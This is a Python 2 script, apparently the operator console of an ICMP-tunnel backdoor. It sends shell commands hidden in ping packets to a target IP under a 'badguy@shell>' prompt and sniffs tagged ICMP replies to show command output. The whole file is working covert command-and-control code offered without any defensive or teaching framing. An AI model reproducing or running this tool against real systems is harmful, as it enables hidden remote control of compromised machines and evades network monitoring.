import socket 
import re 
import struct
import os, sys, threading
from threading import * 
import thread


ICMP_ECHO_REQUEST = 8

def checksum(source_string):
    
    sum = 0
    countTo = (len(source_string)/2)*2
    count = 0
    while count<countTo:
        thisVal = ord(source_string[count + 1])*256 + ord(source_string[count])
        sum = sum + thisVal
        sum = sum & 0xffffffff 
        count = count + 2
 
    if countTo<len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff 
 
    sum = (sum >> 16)  +  (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    # Swap bytes. 
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer


def send_command(ip, command):
    identifier = os.getpid() & 0xFFFF

    send_icmp(ip, command, identifier)

def send_icmp(ip, data, identifier):
    icmp = socket.getprotobyname('icmp')

    dest_address = socket.gethostbyname(ip)

    _socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
    payload = "##"+data

    header_checksum = 0
    # Set checksum bytes to 0 before doing the checksum
    # b = signed char (1byte)
    # H = unsigned short (2byte)
    # h = short (2 byte) 
    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, header_checksum, identifier, 1) #type,code,checksum,identifier,sequence

    header_checksum = checksum(header + payload)
    # Calculate the real checksum
    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, socket.htons(header_checksum), identifier, 1 ) #type,code,checksum,identifier,sequence

    packet = header + payload

    _socket.sendto(packet, (dest_address, 0));
 


def reader():
    f = open('/root/log.txt','r')
    con = f.readline()
    content = con.replace("@@","")
    clearfile()
    return content


#The sniffer part starts here..!!!
def writer(d):
    f = open('/root/log.txt','a')
    f.write(d)
def clearfile():
    f = open('/root/log.txt','w')
    f.write("")
def reader():
    f = open('/root/log.txt','r')
    con = f.readline()
    content = con.replace("@@","")
    clearfile()
    return content


def startsniffing():
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    s.bind(('', 0))
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    print("\nSniffer Started.....")
    while 1:
        data = s.recvfrom(65565)
        d1 = str(data[0])
        d2 = str(data[1])
        data1 = re.search("@@(.*)", d1)
        if (data1 is not None):
            datapart = data1.group(0)
            #print datapart
            writer(datapart)
            #command = data1.group(0)
            #cmd = command[2:]
            #ip = d2[2:-5]
            #print command
            #print ip
            #print data
            print reader()



   

ip = raw_input("Insert the destination IP: ")
thread.start_new_thread(startsniffing,())

while True:
    command = raw_input("badguy@shell>")
    if command == "q" or command == "quit":
        break
    else:
        send_command(ip, command)
        print("Executing command... \n")



